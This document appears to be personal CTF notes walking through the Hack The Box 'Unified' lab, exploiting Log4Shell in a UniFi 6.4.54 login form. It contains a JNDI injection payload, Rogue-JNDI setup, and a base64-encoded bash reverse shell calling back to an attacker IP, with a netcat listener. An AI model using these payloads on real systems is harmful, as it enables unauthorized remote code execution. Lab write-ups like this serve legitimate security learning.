<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>unify</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>unify</h1><br/><img src="images/39-1.png" alt="images/39-1.png" /><br /><br />Upon accessing the page using a browser we are presented with the UniFi web portal login page and the<br />version number is 6.4.54 . If we ever come across a version number it’s always a great idea to research that<br />particular version on Google. A quick Google search using the keywords UniFy 6.4.54 exploit reveals an<br />article that discusses the in-depth exploitation of the CVE-2021-44228 vulnerability within this application.<br />If you would like to learn more about the Log4J vulnerability we have a great Blog post about it.<br /><br /><a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi</a><br /><a href="https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation">https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation</a><br /><br /><br />First, we attempt to login to the page with the credentials test:test as we aren’t trying to validate or gain<br />access. The login request will be captured by BurpSuite and we will be able to modify it.<br />Before we modify the request, let&#39;s send this HTTPS packet to the Repeater module of BurpSuite by<br />pressing CTRL+R .<br /><br />The Exploitation section of the previously mentioned article mentions that we have to input our payload into<br />the remember parameter. Because the POST data is being sent as a JSON object and because the payload<br />contains brackets {} , in order to prevent it from being parsed as another JSON object we enclose it inside<br />brackets &quot; so that it is parsed as a string instead.<br /><br /><img src="images/39-2.png" alt="images/39-2.png" /><br /><br />We input the payload into the remember field as shown above so that we can identify an injection point if<br />one exists. If the request causes the server to connect back to us, then we have verified that the application<br />is vulnerable.<br /><br />${jndi:ldap://{Tun0 IP Address}/whatever}<br /><br /><br /><strong>JNDI</strong> is the acronym for the Java Naming and Directory Interface API . By making calls to this API,<br />applications locate resources and other program objects. A resource is a program object that provides<br />connections to systems, such as database servers and messaging systems.<br /><br /><strong>LDAP</strong> is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,<br />industry standard application protocol for accessing and maintaining distributed directory information<br />services over the Internet or a Network. The default port that LDAP runs on is port 389 .<br /><br /><img src="images/39-3.png" alt="images/39-3.png" /><br /><br />After we hit &quot;send&quot; the &quot;Response&quot; pane will display the response from the request. The output shows us an<br />error message stating that the payload is invalid, but despite the error message the payload is actually being<br />executed.<br /><br />Let&#39;s proceed to starting tcpdump on port 389 , which will monitor the network traffic for LDAP connections.<br /><br /><br />tcpdump is a data-network packet analyzer computer program that runs under a command<br />line interface. It allows the user to display TCP/IP and other packets being<br />transmitted or received over a network to which the computer is attached.<br /><br />Open up another terminal and type:<br />sudo tcpdump -i tun0 port 389<br /><br />The above syntax can be broken down as follows.<br /><br />sudo: Run this via root also known as admin.<br />tcpdump: Is the program or software that is <strong>Wireshark</strong> except, it&#39;s a command line version.<br />-i: Selecting interface. (Example eth0, wlan, tun0)<br />port 389: Selecting the port we are listening on.<br /><br />After tcpdump has been started, click the Send button in burpsuite to send the request aagin. Now we can see response from the server.<br /><br /><img src="images/39-4.png" alt="images/39-4.png" /><br /><br /><br /><strong>Foothold:</strong><br /><br />We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to<br />the server and will give us Remote Code Execution on the vulnerable system.<br /><br /><img src="images/39-5.png" alt="images/39-5.png" /><br /><br />sudo apt-get install maven<br /><br /><img src="images/39-6.png" alt="images/39-6.png" /><br /><br />Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java<br />application.<br /><br />Let&#39;s clone the respective repository and build the package using Maven.<br />git clone <a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a><br />cd rogue-jndi<br />mvn package<br /><br /><img src="images/39-7.png" alt="images/39-7.png" /><br /><br /><br />This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can<br />construct our payload to pass into the RogueJndi-1-1.jar Java application.<br /><br />To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for<br />giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding<br />issues.<br /><br />Creating a Reverse Shell Payload:<br /><br />echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/{Attacker_IP}/{Attacker_Port} 0&gt;&amp;1&#39; | base64<br /><br /><img src="images/39-8.png" alt="images/39-8.png" /><br /><br />After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of<br />the --command option and your tun0 IP address to the --hostname option.<br /><br />java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}&quot; --hostname &quot;{Attacker_IP}&quot;<br /><br />For example:<br /><br />java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;<br /><br /><img src="images/39-9.png" alt="images/39-9.png" /><br /><br />Now that the server is running. We can open a netcat listener at the port specified above. Then return to Burpsuite.<br /><br /><img src="images/39-10.png" alt="images/39-10.png" /><br /><br />After sending the request, a connection to our rogue server is received and the following message is shown.<br /><br />Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload<br /><br />Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can<br />upgrade the terminal shell using the following command.<br /><br />script /dev/null -c bash<br /><br /><img src="images/39-11.png" alt="images/39-11.png" /></div>
</body>
</html>
